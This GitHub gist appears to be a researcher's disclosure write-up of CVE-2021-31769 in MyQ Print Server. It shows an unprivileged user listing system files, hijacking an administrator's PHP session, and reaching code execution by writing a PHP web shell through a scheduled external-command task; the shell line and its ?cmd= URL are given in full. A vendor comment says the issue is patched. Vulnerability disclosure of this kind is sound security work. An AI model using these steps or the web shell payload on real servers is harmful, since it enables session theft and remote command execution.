=== Content from gist.github.com_0121c5f8_20250114_181941.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@bc0d3](https://avatars.githubusercontent.com/u/29527937?s=64&v=4)](/bc0d3)

# [bc0d3](/bc0d3)/**[CVE-2021-31769.md](/bc0d3/6d55866a78f66569383241406e18794f)** Secret

Last active
June 22, 2021 18:25

Show Gist options

* [Download ZIP](/bc0d3/6d55866a78f66569383241406e18794f/archive/c26d9bde697143d03e8a15c32f6327b0cb1d936a.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/bc0d3/6d55866a78f66569383241406e18794f.js&quot;&gt;&lt;/script&gt;
* Save bc0d3/6d55866a78f66569383241406e18794f to your computer and use it in GitHub Desktop.

[Code](/bc0d3/6d55866a78f66569383241406e18794f)
[Revisions
3](/bc0d3/6d55866a78f66569383241406e18794f/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/bc0d3/6d55866a78f66569383241406e18794f.js&quot;&gt;&lt;/script&gt;

Save bc0d3/6d55866a78f66569383241406e18794f to your computer and use it in GitHub Desktop.

[Download ZIP](/bc0d3/6d55866a78f66569383241406e18794f/archive/c26d9bde697143d03e8a15c32f6327b0cb1d936a.zip)

CVE-2021-31769

 [Raw](/bc0d3/6d55866a78f66569383241406e18794f/raw/c26d9bde697143d03e8a15c32f6327b0cb1d936a/CVE-2021-31769.md)

[**CVE-2021-31769.md**](#file-cve-2021-31769-md)

# CVE-2021-31769

## Step by Step

First we install our trial version by downloading it from the following site

<https://smart.myq-solution.com/>

[![1_0001](https://user-images.githubusercontent.com/29527937/122691733-7d100680-d1ff-11eb-9d0f-a35821b48c55.png)](https://user-images.githubusercontent.com/29527937/122691733-7d100680-d1ff-11eb-9d0f-a35821b48c55.png)

once the file is downloaded, we install it in a virtual machine with windows 10, in the case of having a windows server it also works.

We prepare our environment with an administrator user and a user without privileges.

```
admin
user:*admin
password:admin

user
user:bc0d3
pin:2590

```

once we start session with the administrator user we will go to the functionality of "task scheduler" found in the menu on the left "Settings"

[![1_0002](https://user-images.githubusercontent.com/29527937/122691761-94e78a80-d1ff-11eb-85dd-ca782857751b.png)](https://user-images.githubusercontent.com/29527937/122691761-94e78a80-d1ff-11eb-85dd-ca782857751b.png)

Then we click on the "task scheduler" functionality

[![1_0003](https://user-images.githubusercontent.com/29527937/122691777-a2047980-d1ff-11eb-91c4-c37e54d29bb8.png)](https://user-images.githubusercontent.com/29527937/122691777-a2047980-d1ff-11eb-91c4-c37e54d29bb8.png)

We select some functionality that has the function of reading or listing files.

[![1_0004](https://user-images.githubusercontent.com/29527937/122691778-a29d1000-d1ff-11eb-867b-1bc984667028.png)](https://user-images.githubusercontent.com/29527937/122691778-a29d1000-d1ff-11eb-867b-1bc984667028.png)

once it is clicked, a window will appear showing the directories and files of the system.

[![1_0005](https://user-images.githubusercontent.com/29527937/122691779-a335a680-d1ff-11eb-9676-c98b412f58ad.png)](https://user-images.githubusercontent.com/29527937/122691779-a335a680-d1ff-11eb-9676-c98b412f58ad.png)

Being with an administrator user, these functions should only be available for this user, that is, the administrator, but if we see the HTTP requests in bursuite and make the same request with a user without privileges we can see the same directories.

### Administrator user request

Demonstration that the administrator's cookies

[![1_0006](https://user-images.githubusercontent.com/29527937/122691780-a335a680-d1ff-11eb-8ed5-ba5fbce9d726.png)](https://user-images.githubusercontent.com/29527937/122691780-a335a680-d1ff-11eb-8ed5-ba5fbce9d726.png)

http request from listing directory with an administrator cookie.

[![1_0007](https://user-images.githubusercontent.com/29527937/122691781-a335a680-d1ff-11eb-8718-efb7b4a9abf3.png)](https://user-images.githubusercontent.com/29527937/122691781-a335a680-d1ff-11eb-8718-efb7b4a9abf3.png)

We will proceed to the next test where we use a cookie from an unprivileged user and we will also have the same result.

### Non-privileged user request

Demonstration that the cookies of a user without privileges.

[![1_0008](https://user-images.githubusercontent.com/29527937/122691782-a3ce3d00-d1ff-11eb-8910-6755fec7cb3c.png)](https://user-images.githubusercontent.com/29527937/122691782-a3ce3d00-d1ff-11eb-8910-6755fec7cb3c.png)

Http request to list directories with a common user cookie

[![1_0009](https://user-images.githubusercontent.com/29527937/122691783-a3ce3d00-d1ff-11eb-8543-8143b1dc59b2.png)](https://user-images.githubusercontent.com/29527937/122691783-a3ce3d00-d1ff-11eb-8543-8143b1dc59b2.png)

This shows we have privileges to list system files, the MyQ-printserver software runs as `NT AUTHORITY \ SYSTEM` when installed, this means we have privileges to list system files and directories.

## How can we use this to access an administrator account and run commands on the server?

It must be taken into consideration that the myQ system uses apache and php other languages, this means that when using PHP, the sessions are saved in the php directory located in the following path:

`C:\Program Files\MyQ\PHP\Sessions`

when installing the software we will realize it is saved in that path.

[![1_0010](https://user-images.githubusercontent.com/29527937/122691785-a466d380-d1ff-11eb-902d-3a88405d55a7.png)](https://user-images.githubusercontent.com/29527937/122691785-a466d380-d1ff-11eb-902d-3a88405d55a7.png)

now we only have to make a request to the aforementioned route and go through all the sessions to validate which session will be of an administrator user, take that session and add it to the browser to escalate privileges, take access and then execute commands on the server.

# PoC

For this we create a python script that performs this action lists the sessions and their corresponding user.
First we will take the active session of a user without privileges, usually it is delivered for printing.

[![1_0011](https://user-images.githubusercontent.com/29527937/122691786-a466d380-d1ff-11eb-8607-a208fa7ec4c9.png)](https://user-images.githubusercontent.com/29527937/122691786-a466d380-d1ff-11eb-8607-a208fa7ec4c9.png)

we will use our script:

[![1_0012](https://user-images.githubusercontent.com/29527937/122691787-a466d380-d1ff-11eb-9591-a37510645547.png)](https://user-images.githubusercontent.com/29527937/122691787-a466d380-d1ff-11eb-9591-a37510645547.png)

We take the session that it gives us and then we proceed to enter it into the browser to escalate privileges.

[![1_0013](https://user-images.githubusercontent.com/29527937/122691788-a4ff6a00-d1ff-11eb-9071-2702ff0e70f8.png)](https://user-images.githubusercontent.com/29527937/122691788-a4ff6a00-d1ff-11eb-9071-2702ff0e70f8.png)

[![1_0014](https://user-images.githubusercontent.com/29527937/122691789-a4ff6a00-d1ff-11eb-872e-87fb1c2e2425.png)](https://user-images.githubusercontent.com/29527937/122691789-a4ff6a00-d1ff-11eb-872e-87fb1c2e2425.png)

We will have access as administration, an escalation of privileges.

# RCE

For this it is easier once inside the administrator panel we do the following:

* Go to Task Scheduler settings
* Create a new task with external commands
* Add any name, Repeat every 10 minutes, File to run is C:\Windows\System32\calc.exe
* Add the following parameters `& echo ^<?php system($_GET['cmd']);?^> > C:\Program^ Files\MyQ\PhpApps\PrintServer\public\bc0d3.php'`
* Save and then select the task and run it
* Go to the following URL <https://IP:8090/bc0d3.php?cmd=whoami>
  -- :D @bc0d3

reference images

[![1_0015](https://user-images.githubusercontent.com/29527937/122691790-a5980080-d1ff-11eb-8317-d25310f5eae4.png)](https://user-images.githubusercontent.com/29527937/122691790-a5980080-d1ff-11eb-8317-d25310f5eae4.png)

[![1_0016](https://user-images.githubusercontent.com/29527937/122691791-a5980080-d1ff-11eb-99d8-e7518627e309.png)](https://user-images.githubusercontent.com/29527937/122691791-a5980080-d1ff-11eb-99d8-e7518627e309.png)

[![@OneCodeCZ](https://avatars.githubusercontent.com/u/5838839?s=80&v=4)](/OneCodeCZ)

Copy link

### **[OneCodeCZ](/OneCodeCZ)** commented [Jun 22, 2021](/bc0d3/6d55866a78f66569383241406e18794f?permalink_comment_id=3788534#gistcomment-3788534) • edited Loading

Only MyQ administrator is able to add External Commands in the scheduler. It was assumed that MyQ administrator is also the OS administrator which often is the case. However, this issue is fixed in MyQ Print Server 8.2 patch 3. Thank you for reporting.

Sorry, something went wrong.

[![@bc0d3](https://avatars.githubusercontent.com/u/29527937?s=80&v=4)](/bc0d3)

Copy link

Author

### **[bc0d3](/bc0d3)** commented [Jun 22, 2021](/bc0d3/6d55866a78f66569383241406e18794f?permalink_comment_id=3789059#gistcomment-3789059)

> Only MyQ administrator is able to add External Commands in the scheduler. It was assumed that MyQ a

The solution to these vulnerabilities was resolved in the versions , myQ central server 8.2 and myq print server 8.2 (patch 3)

External commands are no longer available and the function of listing files is limited.

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbc0d3%2F6d55866a78f66569383241406e18794f)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


